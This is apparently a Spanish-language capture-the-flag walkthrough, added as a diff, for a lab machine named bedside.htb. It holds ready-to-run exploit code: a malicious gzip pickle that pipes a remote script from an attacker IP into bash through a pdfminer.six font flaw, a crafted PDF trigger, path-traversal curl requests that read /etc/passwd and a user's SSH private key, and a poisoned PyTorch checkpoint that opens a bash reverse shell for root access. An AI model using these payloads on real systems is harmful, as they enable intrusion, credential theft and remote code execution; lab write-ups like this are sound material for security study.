@@ -1,0 +1,152 @@
+* analiza los subdominios encontraras http://research.bedside.htb/
+
+* La respuesta te contestará "powered by pdfminer.six" el cual es vulnerable a CVE-2025-64512
+
+* crea un arcivo pyhton para armar el archivo de fuente malicioso
+
++++++++ File exp.py o cve.py
+#!/usr/bin/env python3
+import pickle
+import gzip
+import os
+
+def create_demo_pickle():
+    print("Creating demonstration pickle file...")
+
+    class EvilPayload:
+        def __reduce__(self):
+            # Comando que se ejecutará al deserializar
+            cmd = "curl -s http://10.10.14.193:8000 | bash"
+            return (os.system, (cmd,))
+
+    demo_cmap_data = EvilPayload()
+    target_path = "./e.pickle.gz"
+
+    try:
+        with gzip.open(target_path, 'wb') as f:
+            pickle.dump(demo_cmap_data, f)
+        print(f"✓ Created demonstration pickle file: {target_path}")
+        return target_path
+    except Exception as e:
+        print(f"✗ Error creating pickle file: {e}")
+        return None
+
+if __name__ == "__main__":
+    create_demo_pickle()
+
+++++++ EOF
+
+* al ejecutar esto obtendras un archivo e.pickle.gz, subelo ar research.bedside.htb
+
+* crea un PDF trigger que ejecute el comando malicioso (En este caso es un curl | bash)
+
+++++ evil.pdf ++++
+
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R
+   /Resources << /Font << /F1 5 0 R >> >> >>
+endobj
+
+4 0 obj
+<< /Length 44 >>
+stream
+BT /F1 12 Tf 100 700 Td (Malicious PDF) Tj ET
+endstream
+endobj
+
+5 0 obj
+<< /Type /Font /Subtype /Type0 /BaseFont /MaliciousFont-Identity-H
+   /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fe
+   /DescendantFonts [6 0 R] >>
+endobj
+
+% EL OBJETO 6 ES EL QUE PROBABLEMENTE FALLA.
+% Aseguramos que sea un CIDFontType2 válido con todas las entradas requeridas.
+6 0 obj
+<< /Type /Font /Subtype /CIDFontType2 /BaseFont /MaliciousFont
+   /CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
+   /FontDescriptor 7 0 R
+   /DW 1000
+   /CIDToGIDMap /Identity   % <-- ESTA LÍNEA ES CLAVE. Sin ella, pdfminer puede ignorar la fuente.
+>>
+endobj
+
+7 0 obj
+<< /Type /FontDescriptor /FontName /MaliciousFont /Flags 4
+   /FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0
+   /Ascent 1000 /Descent -200 /CapHeight 800 /StemV 80 >>
+endobj
+
+xref
+0 8
+0000000000 65535 f 
+0000000009 00000 n 
+0000000058 00000 n 
+0000000115 00000 n 
+0000000274 00000 n 
+0000000370 00000 n 
+0000000503 00000 n 
+0000000673 00000 n 
+trailer
+<< /Size 8 /Root 1 0 R >>
+startxref
+871
+%%EOF
+
+++++ EOF
+
+
+* entraras a un contenedor. en /tmp existe un archivo para analizar puertos. ejecuta y te reportara que el puerto 3000 esta corriendo
+
+* usa chisel para tener el puerto corriendo en local y poder explorarlo
+
+* Este servidor en la consola te chiva que existe un server esm.sh con un LFI. puedes explotarlo asi
+  curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
+
+* usa este CVE para ganar la llave ssh de developer
+  curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
+
+* una vez dentro por ssh  investiga sudo -l, te dara un script ejecutable con privilegios. leelo
+
+* crea un archivo .pt malicioso
+
+++++++ pt-creator.py +++++++
+import torch, os
+
+ATTACKER_IP = "10.10.14.193"   # tu IP tun0
+ATTACKER_PORT = "4444"
+
+CMD = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1'"
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, (CMD,))
+
+payload = {
+    "epoch": 1,
+    "model": Exploit(),
+    "optimizer": {}
+}
+torch.save(payload, "checkpoint_epoch_999.pt")
+
+++++++ EOF ++++
+
+* tienes que colocarlo en /data*/checkpoints pero del docker. no del shell en ssh
+
+* escucha con netcat por el puerto 4444
+
+* Limpia y coloca una imagen png en /data*/proccesed (la que sea) 
+
+* ejecuta el comando sudo que revelo sudo -l y recibe la root shell
+
+
+
